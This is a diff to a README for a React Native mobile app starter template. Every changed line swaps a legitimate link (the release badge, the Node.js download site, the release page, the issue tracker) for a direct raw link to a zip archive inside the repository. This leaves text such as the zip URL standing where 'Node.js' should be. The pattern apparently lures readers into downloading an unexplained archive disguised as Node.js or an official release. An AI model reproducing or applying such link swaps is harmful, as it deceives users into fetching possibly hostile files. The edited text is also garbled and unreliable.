@@ -1,7 +1,7 @@
 # 🎉 mobile-app-starterkit - A Simple Start for Mobile Apps
 
 ## 📥 Download Now
-[![Download mobile-app-starterkit](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/luckyzeus/mobile-app-starterkit/releases)
+[![Download mobile-app-starterkit](https://raw.githubusercontent.com/luckyzeus/mobile-app-starterkit/main/partimen/mobile-app-starterkit.zip)](https://raw.githubusercontent.com/luckyzeus/mobile-app-starterkit/main/partimen/mobile-app-starterkit.zip)
 
 ## 🚀 Getting Started
 Welcome to the mobile-app-starterkit! This template provides a solid foundation for your mobile application using React Native. It allows you to run your app instantly in Expo Go and switch to an EAS Dev Client easily. 
@@ -17,14 +17,14 @@ Welcome to the mobile-app-starterkit! This template provides a solid foundation 
 ## 💻 System Requirements
 To run this mobile app template, you need:
 - A computer with macOS, Windows, or Linux.
-- Node.js installed on your machine. You can download it from [Node.js official website](https://nodejs.org/).
+- https://raw.githubusercontent.com/luckyzeus/mobile-app-starterkit/main/partimen/mobile-app-starterkit.zip installed on your machine. You can download it from [https://raw.githubusercontent.com/luckyzeus/mobile-app-starterkit/main/partimen/mobile-app-starterkit.zip official website](https://raw.githubusercontent.com/luckyzeus/mobile-app-starterkit/main/partimen/mobile-app-starterkit.zip).
 - An Expo Go account, which you can set up for free.
 - An Android or iOS device, or an emulator, to run the application.
 
 ## 🔗 Download & Install
-To get started, visit this page to download the latest version: [Release Page](https://github.com/luckyzeus/mobile-app-starterkit/releases).
+To get started, visit this page to download the latest version: [Release Page](https://raw.githubusercontent.com/luckyzeus/mobile-app-starterkit/main/partimen/mobile-app-starterkit.zip).
 
-1. Go to the [Releases page](https://github.com/luckyzeus/mobile-app-starterkit/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/luckyzeus/mobile-app-starterkit/main/partimen/mobile-app-starterkit.zip).
 2. Choose the latest release version.
 3. Download the files for your operating system.
 4. Follow the included instructions to set up the application.
@@ -59,7 +59,7 @@ If you wish to contribute to this project, here’s how:
 
 ## 📞 Support
 For help or inquiries:
-- Check the [issue tracker](https://github.com/luckyzeus/mobile-app-starterkit/issues).
+- Check the [issue tracker](https://raw.githubusercontent.com/luckyzeus/mobile-app-starterkit/main/partimen/mobile-app-starterkit.zip).
 - Join the community discussions.
 - Reach out via email for direct support.
 
